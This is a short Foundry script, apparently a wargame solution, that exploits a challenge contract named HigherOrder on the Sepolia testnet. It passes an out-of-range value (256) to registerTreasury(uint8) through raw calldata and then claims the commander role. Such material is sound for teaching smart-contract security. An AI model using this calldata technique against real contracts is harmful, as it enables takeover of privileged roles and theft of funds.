// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HigherOrder} from "../src/HigherOrder.sol";

contract HigherOrderScript is Script {
    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6721269);
    }

    function run() public {
        vm.startBroadcast();

        HigherOrder higherOrder = HigherOrder(0x03776Ab3c177B7fDBB6E14Ed03A2210Adb075765);

        (bool success, ) = address(higherOrder).call(
            abi.encodeWithSignature("registerTreasury(uint8)", 256)
        );

        console.log("treasury : ", higherOrder.treasury());

        higherOrder.claimLeadership();

        console.log("commander : ", higherOrder.commander());
    }
}
